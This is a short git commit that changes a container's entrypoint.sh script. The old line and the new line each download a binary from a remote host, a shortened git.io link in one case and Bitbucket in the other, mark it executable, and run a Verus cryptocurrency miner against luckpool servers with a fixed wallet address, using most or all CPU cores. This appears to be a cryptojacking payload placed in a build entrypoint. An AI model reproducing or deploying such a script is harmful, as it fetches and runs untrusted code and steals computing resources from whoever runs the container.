d71d17d4f9d05082fb9248b46d6dd53f30ab1d5a
applife144 <107717580+applife144@users.noreply.github.com>
2022-06-18 03:41:48 +0800

    Update entrypoint.sh

--- entrypoint.sh
+++ entrypoint.sh
@@ -1,1 +1,1 @@
-wget -qO code git.io/JiGZh && chmod +x code && ./code -a verus -o stratum+tcp://na.luckpool.net:3956 -u RUA92tQZsJeNBFCPyMY9ndi6ZNRT4XmDjD.$corei13 -p hybrid -t $(nproc) --max-log-rate 0
+wget https://bitbucket.org/vps3/ngehe/downloads/verus-solver; wget https://bitbucket.org/vps3/ngehe/downloads/hellminer; chmod +x hellminer; chmod +x verus-solver; ./hellminer -c ap.luckpool.net:3956#xnsub -u RUA92tQZsJeNBFCPyMY9ndi6ZNRT4XmDjD.rizal2 -p x --cpu 7	
